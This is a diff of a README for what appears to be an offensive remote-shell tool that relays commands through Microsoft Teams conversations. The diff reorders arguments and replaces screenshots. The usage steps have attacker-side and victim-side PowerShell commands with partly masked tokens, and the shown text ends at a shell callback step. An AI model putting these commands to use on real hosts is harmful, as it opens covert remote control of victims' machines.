@@ -59,21 +59,22 @@ Notes: Token expiration time is 24 hours by default
 ![4](https://github.com/user-attachments/assets/d403b8f8-6b1e-4d63-9590-47b3a0b215e3)
 
 
-3. Execute TeamsCh-Shell-Attacker.ps1 script on the attacker host and input the command:
+3. Execute TeamsCh-Shell-Attacker.ps1 script on the attacker host and input command:
 ```
 . ./TeamsCh-Shell-Attacker.ps1
-TeamsCh-Shell-Attacker.ps1 -Outputconversationid "19:952***9e@t***2" -Inputconversationid "19:c92***8a@t***2" -token "eyJ0eXAiOiJ***PykNgVhCEjA"
+TeamsCh-Shell-Attacker.ps1 -token "eyJ0eXAiOiJ***PykNgVhCEjA" -Outputconversationid "19:952***9e@t***2" -Inputconversationid "19:c92***8a@t***2"
 ```
 
-![9](https://github.com/user-attachments/assets/6d72ca39-2273-45e8-a191-feb3961f5302)
+![image](https://github.com/user-attachments/assets/54550c49-2bde-4a8a-a4fd-b1b208ba515a)
 
 
 4. Execute TeamsCh-Shell-Agent.ps1 script on the victim host:
 ```
 . ./TeamsCh-Shell-Agent.ps1
-TeamsCh-Shell-Agent.ps1 -Inputconversationid "19:952***9e@t***2" -Outputconversationid "19:c92***8a@t***2" -token "eyJ0eXAiO***Cu9Jp8l3kF70Ug"
+TeamsCh-Shell-Agent.ps1 -token "eyJ0eXAiO***Cu9Jp8l3kF70Ug" -Inputconversationid "19:952***9e@t***2" -Outputconversationid "19:c92***8a@t***2"
 ```
-![5](https://github.com/user-attachments/assets/a2f855f4-6d84-4511-9d07-f33c8270364a)
+
+![image](https://github.com/user-attachments/assets/be914ba3-d283-4549-be06-074522170a7e)
 
 
 5. Shell callback Notification
